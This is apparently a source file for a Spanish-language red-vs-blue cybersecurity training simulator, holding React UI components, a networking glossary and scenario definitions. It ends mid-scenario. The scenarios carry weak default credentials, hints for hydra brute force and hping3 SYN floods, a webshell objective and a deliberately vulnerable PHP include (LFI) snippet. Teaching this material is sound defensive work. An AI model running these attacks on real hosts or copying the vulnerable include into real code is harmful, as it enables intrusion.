import React from 'react';
import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment } from './types';

// ============================================================================
// Icon Component (Lucide SVG paths)
// ============================================================================

interface IconProps extends React.SVGProps<SVGSVGElement> {
    name: string;
}

export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
    const iconPaths: { [key: string]: React.ReactNode } = {
        'book-open': <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2zM22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z" />,
        'graduation-cap': <><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c3 3 9 3 12 0v-5"/></>,
        'library': <><path d="m16 6 4 14"/><path d="M12 6v14"/><path d="M8 8v12"/><path d="M4 4v16"/></>,
        'terminal': <><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></>,
        'chevron-down': <polyline points="6 9 12 15 18 9" />,
        'check': <polyline points="20 6 9 17 4 12" />,
        'info': <><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></>,
        'layers': <><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 7 12 12 22 7"/><polyline points="2 17 12 22 22 17"/></>,
        'shield-alert': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4"/><path d="M12 16h.01"/></>,
        'network': <><rect x="16" y="16" width="6" height="6" rx="1"/><rect x="2" y="16" width="6" height="6" rx="1"/><rect x="9" y="2" width="6" height="6" rx="1"/><path d="M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3"/><path d="M12 12V8"/></>,
        'brain-circuit': <><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="M18 5a3 3 0 1 0-5.993.142"/><path d="M21 12a3 3 0 1 0-5.993.142"/><path d="M15 12a3 3 0 1 0-5.993.142"/><path d="M9 12a3 3 0 1 0-5.993.142"/><path d="M12 19a3 3 0 1 0-5.993.142"/><path d="M18 19a3 3 0 1 0-5.993.142"/><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="m14.65 6.01 1.35-.51"/><path d="m13.013 10.511 1.984-1.388"/><path d="m15.013 10.611 1.985 1.288"/><path d="m14.65 17.99 1.35.51"/><path d="m8.65 6.01 7.35-.5"/><path d="m9.013 10.511-1.984-1.388"/><path d="m7.013 10.611-1.985 1.288"/><path d="m8.65 17.99-1.35.51"/></>,
        'shield-off': <><path d="M19.69 14a6.9 6.9 0 0 0 .31-2V5l-8-3-8 3v7c0 6 8 10 8 10"/><path d="m2 2 20 20"/></>,
        'swords': <><path d="M14.5 17.5 3 6"/><path d="m21 3-9.5 9.5"/><path d="m6.5 12.5 11 11"/></>,
        'shield-check': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></>,
        'users': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></>,
        'sword': <><path d="m21.15 12.85-9.17 9.17a2 2 0 0 1-2.83 0L2.85 15.73a2 2 0 0 1 0-2.83l9.17-9.17a6 6 0 0 1 8.49 8.49Z"/><path d="m18 15-4-4"/></>,
        'map-pin': <><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></>,
        'book-open-check': <><path d="M8 3H2v15h7c1.7 0 3 1.3 3 3V7c0-2.2-1.8-4-4-4Z"/><path d="m16 12 2 2 4-4"/><path d="M16 3h6v15h-7c-1.7 0-3 1.3-3 3V7c0-2.2 1.8-4 4-4Z"/></>,
        'book-search': <><path d="M19 21H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v3"/><circle cx="16" cy="16" r="3"/><path d="m21 21-1.4-1.4"/></>,
        'book-copy': <><path d="M2 16s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 12s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 8s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 4s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><rect width="18" height="18" x="3" y="4" rx="2"/><path d="M21 8H10a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h11Z"/><path d="m14 12-2 2 2 2"/><path d="M12 16h3"/></>,
        'shield-half': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 22V2"/></>,
        'radio-tower': <><path d="M4.6 13.7 12 2l7.4 11.7"/><path d="M8.5 12h7"/><path d="M12 12V2"/><path d="m14 16-1-3-1 3h2"/><path d="m10 16-1-3-1 3h2"/><path d="m18 19-3-6-3 6h6"/><path d="m6 19-3-6-3 6h6"/></>,
        'alert-octagon': <><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></>,
        'refresh-cw': <><path d="M3 2v6h6"/><path d="M21 12A9 9 0 0 0 6 5.3L3 8"/><path d="M21 22v-6h-6"/><path d="M3 12a9 9 0 0 0 15 6.7l3-2.7"/></>,
        'search': <><circle cx="11" cy="11" r="8"/><line x1="21" x2="16.65" y1="21" y2="16.65"/></>,
        'chevrons-up': <><path d="m17 11-5-5-5 5"/><path d="m17 18-5-5-5 5"/></>,
        'flag': <><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" x2="4" y1="22" y2="15"/></>,
        'clipboard-list': <><rect width="8" height="4" x="8" y="2" rx="1" ry="1" /><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" /><path d="M12 11h4" /><path d="M12 16h4" /><path d="M8 11h.01" /><path d="M8 16h.01" /></>,
        'target': <><circle cx="12" cy="12" r="10" /><circle cx="12" cy="12" r="6" /><circle cx="12" cy="12" r="2" /></>,
        'file-text': <><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><line x1="16" x2="8" y1="13" y2="13" /><line x1="16" x2="8" y1="17" y2="17" /><line x1="10" x2="8" y1="9" y2="9" /></>,
        'alert-triangle': <><path d="m21.73 18-8-14a2 2 0 0 0-3.46 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></>,
        'binoculars': <><circle cx="15" cy="15" r="3"/><circle cx="9" cy="15" r="3"/><path d="M15 12v-3"/><path d="M9 12v-3"/><path d="m19 12-2-4"/><path d="m5 12 2-4"/></>,
        'file-clock': <><path d="M16 22h2a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v3"/><path d="M4 14a6 6 0 1 0 12 0 6 6 0 0 0-12 0Z"/><path d="M10 14.5V12h-1.5"/></>,
        'log-out': <><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" x2="9" y1="12" y2="12"/></>,
        'bomb': <><circle cx="12" cy="16" r="1"/><path d="M20 12a8 8 0 1 0-16 0"/><path d="M22 8s-1.5 0-3-2c-1.5-2-3-3-3-3"/><path d="m2 8 3-2c1.5-2 3-3 3-3"/></>,
        'download': <><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></>,
        'activity': <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>,
        'file-search': <><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><circle cx="10.5" cy="13.5" r="2.5" /><path d="M12.5 15.5 15 18" /></>,
        'power': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
        'plus-circle': <><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></>,
        'trash': <><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/></>,
        'keyboard': <><rect x="2" y="16" width="20" height="6" rx="2"/><path d="M6 10h4"/><path d="M14 10h4"/><path d="M6 6h.01"/><path d="M10 6h.01"/><path d="M14 6h.01"/><path d="M18 6h.01"/></>,
        'arrow-right-left': <><path d="m16 3 5 5-5 5"/><path d="M21 8H3"/><path d="m8 21-5-5 5-5"/><path d="M3 16h18"/></>,
        'user-x': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="m17 8-6 6"/><path d="m11 8 6 6"/></>,
        'alert-circle': <><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></>,
        'power-off': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
        'user-check': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><polyline points="16 11 18 13 22 9"/></>,
        'shield': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></>,
        'key': <><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></>,
        'crosshair': <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
        'star': <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>,
    };

    return (
        <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className={className}
            {...props}
        >
            {iconPaths[name] || null}
        </svg>
    );
};


export const CisoCard: React.FC<{ icon?: string; title?: string; children: React.ReactNode }> = ({ icon, title, children }) => (
    <div className="bg-[rgba(85,107,47,0.25)] backdrop-blur-md border border-[rgba(184,134,11,0.3)] rounded-xl p-4 sm:p-6 mb-6 last:mb-0 transition-all duration-300 hover:bg-[rgba(85,107,47,0.4)] hover:border-[rgba(184,134,11,0.5)]">
        {title && (
            <h4 className="text-[var(--cv-gold)] font-bold text-lg mb-3 flex items-center">
                {icon && <Icon name={icon} className="h-5 w-5 mr-2 flex-shrink-0" />}
                {title}
            </h4>
        )}
        <div className="text-[var(--text-secondary)] text-sm sm:text-base leading-relaxed space-y-2">
            {children}
        </div>
    </div>
);

export const CisoTable: React.FC<{ headers: string[]; rows: (string | React.ReactNode)[][] }> = ({ headers, rows }) => (
    <div className="overflow-x-auto border border-[rgba(184,134,11,0.2)] rounded-lg my-4 shadow-lg">
        <table className="w-full min-w-[600px] border-collapse">
            <thead>
                <tr>
                    {headers.map((header, i) => (
                        <th key={i} className="p-3 text-left text-sm font-semibold bg-[rgba(184,134,11,0.1)] text-[var(--cv-gold)] whitespace-nowrap border-b border-[rgba(184,134,11,0.2)]">{header}</th>
                    ))}
                </tr>
            </thead>
            <tbody>
                {rows.map((row, i) => (
                    <tr key={i} className="bg-black/10 even:bg-black/20">
                        {row.map((cell, j) => (
                            <td key={j} className="p-3 text-sm text-[var(--text-secondary)] border-b border-[rgba(184,134,11,0.1)] last:border-b-0">{cell}</td>
                        ))}
                    </tr>
                ))}
            </tbody>
        </table>
    </div>
);

// ============================================================================
// Simulation Defaults
// ============================================================================

// FIX: Changed team type to lowercase 'red' | 'blue' to match application-wide types.
const getInitialPrompt = (team: 'red' | 'blue'): PromptState => {
    // FIX: Changed comparison to lowercase 'blue'.
    if (team === 'blue') {
        return { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' };
    }
    return { user: 'pasante-red', host: 'soc-valtorix', dir: '~' };
};

// FIX: Changed team type to lowercase 'red' | 'blue' to match application-wide types.
const getWelcomeMessage = (team: 'red' | 'blue'): TerminalLine[] => [
    // FIX: Updated string to correctly display team name from lowercase type.
    { text: `Bienvenido a la terminal del Equipo ${team === 'red' ? 'Rojo' : 'Azul'}.`, type: 'output' },
    { html: "Escriba <strong class='text-amber-300'>help</strong> para ver sus objetivos y comandos.", type: 'html' },
];

export const DEFAULT_SIMULATION_STATE = {
    firewall_enabled: false,
    ssh_hardened: false,
    banned_ips: [],
    payload_deployed: false,
    is_dos_active: false,
    admin_password_found: false,
    db_config_permissions: '644',
    hydra_run_count: 0,
    server_load: 5.0,
    // FIX: Changed arguments to lowercase to match new function signatures.
    terminal_output_red: getWelcomeMessage('red'),
    terminal_output_blue: getWelcomeMessage('blue'),
    prompt_red: getInitialPrompt('red'),
    prompt_blue: getInitialPrompt('blue'),
};


// ============================================================================
// Static Content Data
// ============================================================================

export const GLOSSARY_TERMS: GlossaryTerm[] = [
    { term: "Dirección IP (IPv4/IPv6)", definition: "Identificador numérico único para dispositivos en una red. (Ver: Guía IP, Fundamentos)" },
    { term: "Modelo OSI", definition: "Modelo teórico de 7 capas (Física, Enlace, Red, Transporte, Sesión, Presentación, Aplicación) para entender la comunicación de redes. (Ver: Protocolos, Fundamentos)" },
    { term: "Modelo TCP/IP", definition: "Modelo práctico de 4 capas (Acceso a Red, Internet, Transporte, Aplicación) sobre el que funciona Internet. (Ver: Protocolos, Fundamentos)" },
    { term: "Protocolo", definition: "Conjunto de reglas que definen cómo se comunican los dispositivos. (Ver: Fundamentos, Protocolos)" },
    { term: "TCP (Protocolo de Control de Transmisión)", definition: "Protocolo de Capa 4, fiable y orientado a conexión (como correo certificado). (Ver: Fundamentos, Protocolos)" },
    { term: "UDP (Protocolo de Datagramas de Usuario)", definition: "Protocolo de Capa 4, rápido y no fiable (como tarjeta postal). (Ver: Fundamentos, Protocolos)" },
    { term: "Puerto de Red", definition: "Identificador numérico (0-65535) que dirige el tráfico a una aplicación específica en un dispositivo. (Ver: Fundamentos)" },
    { term: "Socket", definition: "Combinación de una Dirección IP y un Puerto, creando un punto final de comunicación único (ej. 192.168.1.1:443). (Ver: Fundamentos)" },
    { term: "DNS (Sistema de Nombres de Dominio)", definition: "La \"agenda telefónica\" de Internet. Traduce nombres de dominio (cybervaltorix.com) a direcciones IP. (Ver: Recursos)" },
    { term: "NetID y HostID", definition: "Las dos partes de una IP: el NetID identifica la red y el HostID identifica al dispositivo en esa red. (Ver: Recursos)" },
    { term: "IP Pública vs. Privada", definition: "Pública (única en Internet) vs. Privada (reutilizable en redes locales, ej. 192.168.x.x). (Ver: Recursos)" },
    { term: "NAT (Network Address Translation)", definition: "Permite a múltiples dispositivos en una red privada compartir una única IP pública. (Ver: Recursos)" },
    { term: "Subnetting (Subredes)", definition: "Técnica de dividir una red grande en redes más pequeñas (subredes) para mejorar la organización y seguridad. (Ver: Recursos)" },
    { term: "Máscara de Subred", definition: "Número (ej. 255.255.255.0 o /24) que define qué porción de una IP es el NetID y qué porción es el HostID. (Ver: Recursos)" },
    { term: "VLSM (Máscara de Subred de Longitud Variable)", definition: "Técnica avanzada de subnetting que permite crear subredes de diferentes tamaños para maximizar la eficiencia de IPs. (Ver: Recursos)" },
    { term: "Encapsulación", definition: "Proceso de \"envolver\" datos con encabezados de control a medida que bajan por las capas del modelo de red. (Ver: Recursos)" },
    { term: "PDU (Unidad de Datos de Protocolo)", definition: "El nombre genérico de los \"datos\" en cada capa: Trama (Capa 2), Paquete (Capa 3), Segmento/Datagrama (Capa 4). (Ver: Recursos)" },
];

export const fortressScenario: InteractiveScenario = {
    id: 'escenario7',
    isInteractive: true,
    icon: 'shield-check', 
    color: 'bg-indigo-500',
    title: 'Fortaleza Digital (Hardening vs. Pentest)',
    subtitle: 'Equipo Rojo vs. Equipo Azul',
    description: 'El servidor BOVEDA-WEB es vulnerable. El Equipo Azul debe asegurarlo antes de que el Equipo Rojo lo comprometa.',
    difficulty: 'intermediate',
    team: 'both',
    initialEnvironment: {
        networks: {
            'dmz': {
                hosts: [{
                    ip: '10.0.10.5',
                    hostname: 'BOVEDA-WEB',
                    os: 'linux',
                    services: {
                        22: { name: 'ssh', version: 'OpenSSH 7.4', state: 'open', vulnerabilities: [] },
                        80: { name: 'http', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [{ cve: 'CVE-2021-CUSTOM', description: 'Weak default config', severity: 'medium' }] },
                        443: { name: 'https', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [{ cve: 'CVE-2021-SSL', description: 'Weak SSL cipher', severity: 'high' }] },
                        3306: { name: 'mysql', version: 'MySQL 5.5', state: 'open', vulnerabilities: [] }
                    },
                    users: [
                        { username: 'root', password: 'toor', privileges: 'root' },
                        { username: 'blue-team', password: 'SecureP@ss2024!', privileges: 'admin' }
                    ],
                    files: [
                        { path: '/var/www/html/db_config.php', permissions: '644', content: '<?php\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n?>', hash: 'abc123def' },
                        { path: '/etc/ssh/sshd_config', permissions: '600', content: '#Default Config\nPermitRootLogin yes\n', hash: 'def456abc' }
                    ]
                }],
                firewall: { enabled: false, rules: [] },
                ids: { enabled: false, signatures: [], alerts: [] }
            }
        },
        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    objectives: [
        { id: 'blue-firewall', description: 'Activar el firewall UFW y permitir solo SSH y HTTP/HTTPS', points: 20, required: true, validator: (env) => {
                const fw = env.networks.dmz.firewall;
                const mysqlRule = fw.rules.find(r => r.destPort === 3306);
                return fw.enabled && 
                       fw.rules.some(r => r.action === 'allow' && r.destPort === 22) &&
                       fw.rules.some(r => r.action === 'allow' && r.destPort === 80) &&
                       fw.rules.some(r => r.action === 'allow' && r.destPort === 443) &&
                       (!mysqlRule || mysqlRule.action === 'deny');
            }, hint: 'Comandos: sudo ufw enable, sudo ufw allow <puerto>, sudo ufw deny <puerto>'
        },
        { id: 'blue-ssh-hardening', description: 'Deshabilitar login directo de root en SSH', points: 15, required: true, validator: (env) => {
                const host = env.networks.dmz.hosts.find(h => h.hostname === 'BOVEDA-WEB');
                const sshConfig = host?.files.find(f => f.path === '/etc/ssh/sshd_config');
                return sshConfig?.content?.includes('PermitRootLogin no') ?? false;
            }, hint: 'Usa "sudo nano /etc/ssh/sshd_config" para editar y "sudo systemctl restart sshd" para aplicar.'
        },
        { id: 'blue-file-permissions', description: 'Asegurar db_config.php (permisos 640 o más restrictivos)', points: 15, required: true, validator: (env) => {
                const host = env.networks.dmz.hosts.find(h => h.hostname === 'BOVEDA-WEB');
                const dbConfig = host?.files.find(f => f.path === '/var/www/html/db_config.php');
                return parseInt(dbConfig?.permissions ?? '644', 8) <= parseInt('640', 8);
            }, hint: 'Comando: sudo chmod 640 /var/www/html/db_config.php'
        },
        { id: 'red-reconnaissance', description: 'Escanear BOVEDA-WEB y descubrir servicios vulnerables', points: 10, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5'), hint: 'Usa nmap con flags -sV y -sC para detectar versiones y vulnerabilidades.'
        },
        { id: 'red-bruteforce', description: 'Obtener credenciales SSH de root mediante fuerza bruta', points: 25, required: true, validator: (env) => env.attackProgress.credentials['root@10.0.10.5'] === 'toor', hint: 'Usa hydra con un wordlist contra el servicio SSH.'
        },
        { id: 'red-compromise', description: 'Comprometer BOVEDA-WEB completamente (acceso root)', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.10.5'), hint: 'Después de obtener credenciales, usa SSH para conectarte.'
        },
    ],
    hints: [
        { trigger: (env) => env.timeline.filter(log => log.message.includes('hydra')).length > 5, message: '🚨 [EQUIPO AZUL] ¡Ataque de fuerza bruta detectado! Revisa los logs de autenticación y bloquea la IP de origen con UFW.' },
        { trigger: (env) => {
            const sshSecured = env.networks.dmz.hosts[0]?.files.find(f => f.path === '/etc/ssh/sshd_config')?.content?.includes('PermitRootLogin no');
            return env.timeline.length > 10 && !sshSecured;
          }, message: '💡 [EQUIPO AZUL] Tip: El login directo de root es una vulnerabilidad crítica. Desactívalo en /etc/ssh/sshd_config.'
        }
    ],
    evaluation: (env) => ({ completed: false, score: 0, feedback: [] }) // Simplified for now
};

const calculateResponseTime = (env: VirtualEnvironment): string => {
    const attackLog = env.timeline.find(log => log.message.includes('hydra') || log.message.includes('hping3'));
    const defenseLog = env.timeline.find(log => log.message.includes('ufw deny from') || log.message.includes('fail2ban-client'));

    if (attackLog && defenseLog) {
        const attackTime = new Date(attackLog.timestamp).getTime();
        const defenseTime = new Date(defenseLog.timestamp).getTime();
        const diffSeconds = (defenseTime - attackTime) / 1000;
        return `${Math.max(0, diffSeconds).toFixed(1)}s`;
    }
    return 'N/A';
};

export const rageScenario: InteractiveScenario = {
    id: 'escenario8',
    isInteractive: true,
    icon: 'bomb',
    color: 'bg-orange-600',
    title: 'Furia en la Red: Ataque Combinado',
    subtitle: 'Equipo Rojo vs. Equipo Azul',
    description: 'DoS + Bruteforce simultáneos. Azul debe priorizar y contener bajo presión.',
    difficulty: 'advanced',
    team: 'both',
    
    initialEnvironment: {
        networks: {
            'dmz': {
                hosts: [{
                    ip: '10.0.20.10',
                    hostname: 'PORTAL-WEB',
                    os: 'linux',
                    services: {
                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                        80: { name: 'http', version: 'nginx 1.18', state: 'open', vulnerabilities: [] },
                        443: { name: 'https', version: 'nginx 1.18', state: 'open', vulnerabilities: [] }
                    },
                    users: [
                        { username: 'admin', password: 'P@ssw0rd', privileges: 'admin' },
                        { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' }
                    ],
                    files: [
                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "PORTAL-WEB v1.0"; ?>', hash: 'original_hash_123' }
                    ],
                    systemState: {
                        cpuLoad: 5.0,
                        memoryUsage: 30.0,
                        networkConnections: 50,
                        failedLogins: 0
                    }
                }],
                firewall: {
                    enabled: true,
                    rules: [
                        { id: '1', action: 'allow', protocol: 'tcp', destPort: 22 },
                        { id: '2', action: 'allow', protocol: 'tcp', destPort: 80 },
                        { id: '3', action: 'allow', protocol: 'tcp', destPort: 443 }
                    ]
                },
                ids: {
                    enabled: true,
                    signatures: ['SSH_BRUTEFORCE', 'SYN_FLOOD', 'HTTP_DOS'],
                    alerts: []
                }
            }
        },
        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    
    objectives: [
        // === EQUIPO ROJO ===
        { id: 'red-dos-attack', description: 'Lanzar ataque DoS contra PORTAL-WEB (CPU > 90%)', points: 20, required: true, validator: (env) => {
                const host = env.networks.dmz.hosts.find(h => h.hostname === 'PORTAL-WEB');
                return (host?.systemState?.cpuLoad ?? 0) > 90;
            }, hint: 'Usa hping3 con flag --flood -S para SYN flood'
        },
        { id: 'red-bruteforce-success', description: 'Obtener credenciales de admin mientras el DoS está activo', points: 30, required: true, validator: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'], hint: 'Lanza hydra con wordlist rockyou.txt mientras el DoS cubre tu rastro'
        },
        { id: 'red-deploy-backdoor', description: 'Acceder al servidor y modificar index.php (webshell)', points: 35, required: true, validator: (env) => {
                const host = env.networks.dmz.hosts.find(h => h.hostname === 'PORTAL-WEB');
                const indexFile = host?.files.find(f => f.path === '/var/www/html/index.php');
                return indexFile?.hash !== 'original_hash_123';
            }, hint: 'Después de SSH, usa nano para editar /var/www/html/index.php y cambiar su contenido'
        },
        
        // === EQUIPO AZUL ===
        { id: 'blue-detect-dos', description: 'Identificar el ataque DoS analizando la carga del sistema', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && (log.message.includes('top') || log.message.includes('htop'))), hint: 'Usa "top" o "htop" para ver la carga del CPU'
        },
        { id: 'blue-detect-bruteforce', description: 'Identificar el ataque de fuerza bruta en logs', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && (log.message.includes('journalctl') || log.message.includes('grep'))), hint: 'Revisa /var/log/auth.log o usa "journalctl -u sshd"'
        },
        { id: 'blue-block-attacker', description: 'Bloquear la IP del atacante en el firewall', points: 25, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100'), hint: 'Usa "sudo ufw deny from <IP>" o fail2ban'
        },
        { id: 'blue-verify-integrity', description: 'Verificar integridad de archivos web (detectar backdoor)', points: 20, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && (log.message.includes('sha256sum') || log.message.includes('md5sum'))), hint: 'Usa "sha256sum /var/www/html/index.php" y compara con hash original'
        },
    ],
    
    hints: [
        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 70, message: '🚨 [EQUIPO AZUL] CPU crítica! Ejecuta "top" inmediatamente para diagnosticar.' },
        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.failedLogins ?? 0) > 10, message: '⚠️ [EQUIPO AZUL] Múltiples intentos de login fallidos detectados. Revisa logs AHORA.' },
        { trigger: (env) => {
            const hasCredentials = !!env.attackProgress.credentials['admin@10.0.20.10'];
            const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
            return hasCredentials && !isBlocked;
          }, message: '🔴 [EQUIPO AZUL] ALERTA CRÍTICA: Credenciales comprometidas. Bloquea la IP INMEDIATAMENTE.'
        },
    ],
    
    evaluation: (env) => {
        const redPoints = ['red-dos-attack', 'red-bruteforce-success', 'red-deploy-backdoor'].reduce((sum, id) => {
            const obj = rageScenario.objectives.find(o => o.id === id);
            return sum + (obj?.validator(env) ? obj.points : 0);
        }, 0);
        const bluePoints = ['blue-detect-dos', 'blue-detect-bruteforce', 'blue-block-attacker', 'blue-verify-integrity'].reduce((sum, id) => {
            const obj = rageScenario.objectives.find(o => o.id === id);
            return sum + (obj?.validator(env) ? obj.points : 0);
        }, 0);
        
        const feedback: string[] = [];
        const isCompromised = env.attackProgress.compromised.includes('10.0.20.10');
        const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
        
        if (isCompromised && !isBlocked) {
            feedback.push('⚔️ **VICTORIA DECISIVA DEL EQUIPO ROJO**');
        } else if (isBlocked && !isCompromised) {
            feedback.push('🛡️ **VICTORIA DEL EQUIPO AZUL**');
        } else if (isCompromised && isBlocked) {
            feedback.push('⚖️ **ESCENARIO MIXTO**');
        } else {
            feedback.push('📊 **ESCENARIO INCOMPLETO**');
        }
        feedback.push(`\n**Puntuación:** Rojo ${redPoints}/85 | Azul ${bluePoints}/65`);
        if (isBlocked) {
            feedback.push(`✓ Atacante bloqueado (Tiempo de respuesta: ${calculateResponseTime(env)})`);
        }
        return { completed: redPoints >= 70 || bluePoints >= 60, score: Math.max(redPoints, bluePoints), feedback };
    }
};

export const killChainScenario: InteractiveScenario = {
    id: 'escenario9',
    isInteractive: true,
    icon: 'crosshair',
    color: 'bg-red-800',
    title: 'La Cadena de Infección (Kill Chain)',
    subtitle: 'Ataque multi-fase desde la DMZ hasta la red interna.',
    description: 'El Equipo Rojo debe ejecutar una "Kill Chain" completa, desde la explotación web hasta la exfiltración de datos. El Equipo Azul debe cazar y contener la amenaza en cada fase.',
    difficulty: 'advanced',
    team: 'both',
    initialEnvironment: {
        networks: {
            'dmz': {
                hosts: [{
                    ip: '10.0.0.10',
                    hostname: 'WEB-DMZ-01',
                    os: 'linux',
                    services: {
                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                        80: { name: 'nginx', version: '1.18', state: 'open', vulnerabilities: [{cve: 'CVE-2013-4547', description: 'LFI Vulnerability', severity: 'high'}] },
                    },
                    users: [{ username: 'blue-team', password: 'Blu3T34mDMZ!2024', privileges: 'admin' }],
                    files: [{ path: '/var/www/html/view.php', permissions: '644', content: '<?php include($_GET["file"]); ?>', hash: 'lfi_vuln_hash' }]
                }],
                firewall: { enabled: true, rules: [{id: 'allow-ssh', action: 'allow', protocol: 'tcp', destPort: 22}, {id: 'allow-http', action: 'allow', protocol: 'tcp', destPort: 80}] },
                ids: { enabled: true, signatures: ['LFI_ATTEMPT', 'REVERSE_SHELL'], alerts: [] }
            },
            'internal': {
                hosts: [{
                    ip: '10.10.0.50',
